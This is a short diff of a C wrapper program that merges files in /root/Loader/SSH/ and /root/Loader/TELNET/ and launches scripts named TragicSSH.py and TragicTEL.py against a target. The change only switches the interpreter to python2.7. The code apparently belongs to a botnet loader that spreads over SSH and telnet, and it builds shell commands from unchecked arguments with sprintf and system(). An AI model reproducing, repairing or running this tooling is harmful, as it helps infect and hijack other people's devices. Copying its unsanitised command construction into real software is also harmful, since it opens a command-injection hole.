@@ -41,7 +41,7 @@ int main(int argc, char **argv)
                 tdir = "/root/Loader/SSH/";
                 sprintf(merge, "cd %s; cat * > /root/Loader/%s", tdir, NAME);
                 system(merge);
-                sprintf(load, "cd /root/Loader/; python -W ignore TragicSSH.py %s", NAME);
+                sprintf(load, "cd /root/Loader/; python2.7 -W ignore TragicSSH.py %s", NAME);
                 system(load);
                 sleep(2);
                 exit(0);
@@ -51,7 +51,7 @@ int main(int argc, char **argv)
                 tdir = "/root/Loader/TELNET/";
                 sprintf(merge, "cd %s; cat * > /root/Loader/%s", tdir, NAME);
                 system(merge);
-                sprintf(load, "cd /root/Loader/; python -W ignore TragicTEL.py %s", NAME);
+                sprintf(load, "cd /root/Loader/; python2.7 -W ignore TragicTEL.py %s", NAME);
                 system(load);
                 sleep(2);
                 exit(0);
@@ -74,7 +74,7 @@ int main(int argc, char **argv)
                 if (dir == 1)
                 {
                     tdir = "/root/Loader/SSH/";
-                    sprintf(load, "cd /root/Loader/; python -W ignore TragicSSH.py %s", TARG);
+                    sprintf(load, "cd /root/Loader/; python2.7 -W ignore TragicSSH.py %s", TARG);
                     system(load);
                     sleep(2);
                     exit(0);
@@ -82,7 +82,7 @@ int main(int argc, char **argv)
                 else if (dir == 2)
                 {
                     tdir = "/root/Loader/TELNET/";
-                    sprintf(load, "cd /root/Loader/; python -W ignore TragicTEL.py %s", TARG);
+                    sprintf(load, "cd /root/Loader/; python2.7 -W ignore TragicTEL.py %s", TARG);
                     system(load);
                     sleep(2);
                     exit(0);
